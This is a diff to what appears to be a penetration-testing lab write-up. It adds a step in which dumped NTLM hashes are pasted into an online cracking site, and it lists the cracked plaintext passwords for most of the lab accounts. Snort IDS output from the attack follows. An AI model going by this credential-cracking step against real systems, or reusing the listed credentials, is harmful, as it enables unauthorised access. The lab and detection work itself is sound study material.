@@ -451,6 +451,28 @@ kylo_ren:1018:NO PASSWORD*********************:74C0A3DD06613D3240331E94AE18B001:
 
 c:\tmp> 
 ```
+Pasting the hashed passwords (NTLM) into https://hashkiller.co.uk/ntlm-decrypter.aspx gives:
+```
+e02bc503339d51f71d913c245d35b50b NTLM : vagrant
+8d0a16cfc061c3359db455d00ec27035 NTLM : D@rj33l1ng
+8ae6a810ce203621cf9cfa6f21f14028 [Not found]
+481e6150bde6998ed22b0e9bac82005a NTLM : use_the_f0rce
+33ed98c5969d05a7c15c25c99e3ef951 NTLM : sh00t-first
+fac6aada8b7afc418b3afea63b7577b4 NTLM : beep_b00p
+0fd2eb40c4aa690171ba066c037397ee NTLM : pr0t0c0l
+4fb77d816bce7aeee80d7c2e5e55c859 NTLM : thats_no_moon
+b73a851f8ecff7acafbaa4a806aea3e0 NTLM : d@rk_sid3
+c706f83a7b17a0230e55cde2f3de94fa NTLM : yipp33!!
+ec1dcd52077e75aef4a1930b0917c4d4 [Not found]
+62708455898f2d7db11cfb670042a53f NTLM : b@ckstab
+d60f9a4859da4feadaf160e97d200dc9 NTLM : mandalorian1
+93ec4eaa63d63565f37fe7f28d99ce76 [Not found]
+ce269c6b7d9e2f1522b44686b49082db NTLM : hanShotFirst!
+e7200536327ee731c7fe136af4575ed8 NTLM : rwaaaaawr5
+74c0a3dd06613d3240331e94ae18b001 NTLM : daddy_issues1
+```
+So, all but 3 passwords were cracked.
+
 And snort2 output from this attack:
 ```
 Commencing packet processing (pid=8736) 
